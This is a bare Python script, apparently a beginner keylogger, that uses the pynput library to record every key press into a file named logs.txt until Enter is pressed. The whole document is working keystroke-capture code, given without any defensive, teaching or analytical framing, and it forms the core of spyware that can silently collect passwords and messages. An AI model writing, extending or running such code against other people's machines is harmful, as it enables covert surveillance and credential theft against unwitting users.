from pynput.keyboard import Listener, Key
logger = []
def StoreKeys(key):
    logger.append(key)
    with open("logs.txt","w") as f:
        for i in logger:
            i = str(i)
            f.write(i)
def Halt(key):
    if key == Key.enter: 
        return False
with Listener(on_press = StoreKeys, on_release = Halt) as listener:  
    listener.join()  



